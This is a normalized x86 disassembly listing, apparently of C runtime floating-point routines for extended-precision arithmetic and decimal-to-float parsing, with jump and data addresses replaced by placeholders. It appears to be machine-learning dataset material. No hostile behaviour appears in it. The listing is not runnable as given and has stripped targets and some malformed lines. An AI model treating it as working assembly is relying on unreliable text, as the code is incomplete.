jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_43f616
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0xa ]
and [ ebp - 0x20 ] 0x0
mov eax edx
and eax 0x7fff
and edx 0x8000
push esi
mov esi [ ecx + 0x6 ]
mov [ ebp - 0x14 ] eax
mov eax edx
mov edx [ ecx + 0x2 ]
movzx ecx [ ecx ]
shl ecx 0x10
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] ecx
test ecx ecx
jns r-xdata
mov ecx 0x7fff
cmp [ ebp - 0x14 ] cx
jne r-xdata
test ecx 0x7fffffff
je r-xdata
or eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ax
mov eax [ ebp - 0x20 ]
mov [ edi ] edx
pop edi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn
mov [ ebp - 0x20 ] 0x1
lea ecx [ edx + 0x1 ]
xor esi esi
cmp ecx edx
jb r-xdata
xor esi esi
inc esi
cmp ecx 0x1
jae r-xdata
mov esi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
and [ ebp - 0x1c ] 0x0
lea ecx [ ebp + ecx * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0xc ] ecx
mov ecx esi
mov [ ebp - 0x1c ] 0x1
cmp esi 0x1
jae r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
dec [ ebp - 0x18 ]
mov [ ecx ] esi
mov ecx [ ebp - 0x1c ]
jns r-xdata
inc [ ebp - 0x14 ]
mov esi 0x80000000
jmp r-xdata
mov edx [ ebp - 0xc ]
sub_43f6f3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax ]
mov ecx esi
add esi esi
push edi
mov edi [ eax + 0x4 ]
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
pop edi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
pop esi
pop ebp
retn
sub_43f726
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
push edi
mov edi ecx
mov esi edx
shr ecx 0x1
shl esi 0x1f
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr edx 0x1
shr ecx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
pop ebp
retn
sub_43f758
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
mov ebx [ ebp + 0xc ]
movzx edx [ ebx + 0xa ]
push esi
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x20 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
push edi
movzx esi si
mov edi 0x7fff
mov [ ebp - 0x30 ] esi
cmp cx di
jae r-xdata
xor edx edx
xor ecx ecx
cmp [ ebp - 0x20 ] cx
sete dl
dec edx
and edx 0x80000000
add edx 0x7fff8000
mov [ eax + 0x8 ] edx
cmp dx di
jae r-xdata
mov edi 0xbffd
cmp si di
ja r-xdata
mov edi 0x3fbf
cmp si di
ja r-xdata
mov edi 0x7fffffff
test cx cx
jne r-xdata
xor ecx ecx
xor ecx ecx
inc esi
mov [ ebp - 0x30 ] esi
test [ eax + 0x8 ] edi
jne r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ ebp - 0x1c ] ecx
lea edi [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x5
inc esi
mov [ ebp - 0x30 ] esi
test [ ebx + 0x8 ] edi
jne r-xdata
xor ecx ecx
cmp [ eax + 0x4 ] ecx
jne r-xdata
add edi 0x2
inc [ ebp - 0x1c ]
dec [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
add ebx 0x8
mov [ ebp - 0x24 ] ebx
lea ebx [ eax + ecx ]
cmp [ ebx + 0x4 ] ecx
jne r-xdata
cmp dx cx
jne r-xdata
cmp [ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
add ecx ecx
mov [ ebp - 0x28 ] edx
test edx edx
jle r-xdata
add esi 0xc002
mov edi 0xffff
test si si
jle r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi ecx
jae r-xdata
cmp [ ebx ] ecx
je r-xdata
mov [ eax + 0xa ] cx
jmp r-xdata
add esi edi
test si si
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
sub [ ebp - 0x24 ] 0x2
add ebx 0x2
dec [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x14 ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov ecx 0x8000
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov ecx esi
neg ecx
movzx ecx cx
mov [ ebp - 0x14 ] ecx
add esi ecx
test si si
jg r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr ecx 0x1f
add ebx ebx
or ebx ecx
mov ecx [ ebp - 0x8 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add esi edi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
test si si
jg r-xdata
mov edx [ ebp - 0x24 ]
movzx edx [ edx ]
movzx ecx [ ebx ]
and [ ebp - 0x14 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea esi [ edx + ecx ]
cmp esi edx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ ebp - 0x30 ]
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec [ ebp - 0x14 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x2c ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov ecx 0x7fff
cmp si cx
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov cx [ ebp - 0xe ]
or esi [ ebp - 0x20 ]
mov [ eax ] cx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x2 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x6 ] ecx
mov [ eax + 0xa ] si
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
cmp [ ebp - 0x6 ] di
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] cx
inc esi
jmp r-xdata
sub_43f9d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx rw-data
sub ecx 0x60
xor edx edx
mov [ ebp - 0x24 ] ecx
cmp [ ebp + 0xc ] edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4247dc
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
neg [ ebp + 0xc ]
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x24 ] ecx
cmp [ ebp + 0xc ] edx
je r-xdata
xor ecx ecx
mov [ eax ] cx
push ebx
push esi
push edi
xor edx edx
cmp [ ebp + 0xc ] edx
jne r-xdata
imul ecx ecx 0xc
add ecx [ ebp - 0x24 ]
mov ebx ecx
mov ecx 0x8000
cmp [ ebx ] cx
jb r-xdata
mov ecx [ ebp + 0xc ]
add [ ebp - 0x24 ] 0x54
sar [ ebp + 0xc ] 0x3
and ecx 0x7
cmp ecx edx
je r-xdata
pop edi
pop esi
pop ebx
movzx ecx [ eax + 0xa ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
movzx edx [ ebx + 0xa ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x30 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea edi [ edx + ecx ]
movzx edi di
mov [ ebp - 0x28 ] edi
cmp cx si
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x1a ]
lea ebx [ ebp - 0x1c ]
xor edx edx
xor ecx ecx
cmp [ ebp - 0x30 ] cx
sete dl
dec edx
and edx 0x80000000
add edx 0x7fff8000
mov [ eax + 0x8 ] edx
cmp dx si
jae r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor ecx ecx
mov [ eax + 0x8 ] ecx
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ eax + 0x8 ] 0x7fffffff
mov [ ebp - 0x28 ] edi
jne r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ ebp - 0x34 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x5
inc edi
test [ ebx + 0x8 ] 0x7fffffff
mov [ ebp - 0x28 ] edi
jne r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
add esi 0x2
inc [ ebp - 0x34 ]
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x0
jg r-xdata
lea edx [ ebx + 0x8 ]
add ecx eax
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] ecx
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ eax ] esi
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x20 ]
add ecx ecx
mov [ ebp - 0x2c ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp edi ecx
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor ecx ecx
mov [ eax + 0xa ] cx
jmp r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x3c ] 0x2
sub [ ebp - 0x40 ] 0x2
dec [ ebp - 0x2c ]
cmp [ ebp - 0x2c ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x44 ] 0x0
mov [ esi - 0x4 ] edi
je r-xdata
mov [ eax + 0x8 ] esi
mov [ eax + 0x4 ] esi
mov [ eax ] esi
jmp r-xdata
mov ecx 0x8000
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov ecx edi
neg ecx
movzx esi cx
add edi esi
test di di
jg r-xdata
mov esi [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
shr ecx 0x1f
mov edx esi
add esi esi
or esi ecx
mov ecx [ ebp - 0x8 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add edi 0xffff
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] ecx
test di di
jg r-xdata
mov ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x40 ]
movzx edx [ edx ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ esi - 0x4 ]
lea edi [ edx + ecx ]
cmp edi edx
jb r-xdata
mov edi [ ebp - 0x28 ]
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec esi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x38 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov ecx 0x7fff
cmp di cx
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x38 ] esi
je r-xdata
mov cx [ ebp - 0xe ]
or edi [ ebp - 0x30 ]
mov [ eax ] cx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x2 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x6 ] ecx
mov [ eax + 0xa ] di
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov edx 0xffff
cmp [ ebp - 0x6 ] dx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] cx
inc edi
jmp r-xdata
sub_43fcd2
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_44037e ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_445f00
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
